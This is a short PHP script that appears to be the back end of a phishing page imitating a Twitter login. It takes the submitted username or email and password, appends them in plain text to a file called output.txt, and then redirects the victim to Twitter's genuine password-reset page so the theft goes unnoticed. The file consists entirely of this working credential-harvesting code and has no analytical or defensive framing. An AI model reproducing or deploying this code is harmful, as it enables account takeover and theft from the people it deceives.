<?php

file_put_contents("output.txt", "Username: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/account/begin_password_reset');
exit();
